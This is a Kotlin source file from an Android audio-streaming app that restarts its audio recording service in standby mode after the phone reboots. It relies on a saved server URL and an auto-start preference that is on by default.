package com.audiostream.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

/**
 * BootReceiver.kt — Auto-start recording after phone reboot.
 *
 * Listens for BOOT_COMPLETED and LOCKED_BOOT_COMPLETED broadcasts.
 * If the user had previously started the service, this receiver
 * automatically restarts it with the saved server URL.
 *
 * The "auto-start" preference is saved in SharedPreferences and is
 * enabled by default (as per user requirements).
 */

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == "android.intent.action.QUICKBOOT_POWERON" ||
            action == Intent.ACTION_LOCKED_BOOT_COMPLETED
        ) {
            val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)

            // Check if auto-start is enabled (default: true)
            val autoStart = prefs.getBoolean("auto_start_on_boot", true)
            if (!autoStart) return

            // Check if we have a saved server URL
            val serverUrl = prefs.getString("server_url", null) ?: return

            // Start the AudioRecordService in Standby Mode
            try {
                val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
                    this.action = AudioRecordService.ACTION_STANDBY
                    putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
                }
                ContextCompat.startForegroundService(context, serviceIntent)
            } catch (e: Exception) {
                // Failed to start — can't do much here
                e.printStackTrace()
            }
        }
    }
}
